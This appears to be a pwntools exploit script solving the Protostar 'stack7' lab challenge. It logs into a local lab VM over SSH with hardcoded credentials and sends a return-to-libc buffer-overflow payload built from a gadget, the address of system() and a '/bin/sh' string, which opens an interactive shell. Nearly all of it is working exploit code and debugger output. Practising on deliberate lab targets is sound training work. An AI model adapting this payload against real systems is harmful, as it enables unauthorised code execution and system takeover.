#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template stack5
from pwn import *
context.update(arch='i386', os='linux')

#padding = cyclic(cyclic_find(0x61616174))
'''
f = open('/tmp/foo', 'wb')
f.write(payload)
f.close()
'''

# gdb ./stack6; b main; r; p system
system_addr = 0xb7ecffb0

'''
# $ ldd stack6
# $ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
# 11f3bf /bin/sh
(gdb) info proc mapping
process 17702
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

Start Addr   End Addr       Size     Offset objfile
0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
0x40000000 0x4001b000    0x1b000          0         /lib/ld-2.11.2.so
0x4001b000 0x4001c000     0x1000    0x1a000         /lib/ld-2.11.2.so
0x4001c000 0x4001d000     0x1000    0x1b000         /lib/ld-2.11.2.so
0x4001d000 0x4001e000     0x1000          0           [vdso]
0x4001e000 0x40020000     0x2000          0        
0x40024000 0x40162000   0x13e000          0         /lib/libc-2.11.2.so
0x40162000 0x40163000     0x1000   0x13e000         /lib/libc-2.11.2.so
0x40163000 0x40165000     0x2000   0x13e000         /lib/libc-2.11.2.so
0x40165000 0x40166000     0x1000   0x140000         /lib/libc-2.11.2.so
0x40166000 0x4016a000     0x4000          0        
0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) x/s 0x40024000+0x11f3bf
0x401433bf:      "/bin/sh"
'''
binSh_addr = 0xb7e97000 + 0x11f3bf

'''
siuser@ubuntu:~/ctf/protostar/stack7$ msfelfscan -p stack7
[stack7]
0x08048492 pop ebx; pop ebp; ret
0x080485c7 pop edi; pop ebp; ret
0x080485f7 pop ebx; pop ebp; ret
'''
retGadget = 0x08048492

s = ssh(host='192.168.12.128', user='user', password='user')
sh = s.run('/opt/protostar/bin/stack7')
payload = b'a'*80
payload += p32(retGadget)
payload += p32(0xdeadbeef)
payload += p32(0xdeadbeef)
payload += p32(system_addr)
payload += b'\x90'*4
payload += p32(binSh_addr)
print(sh.recv())
sh.sendline(payload)
sh.interactive()
s.close()


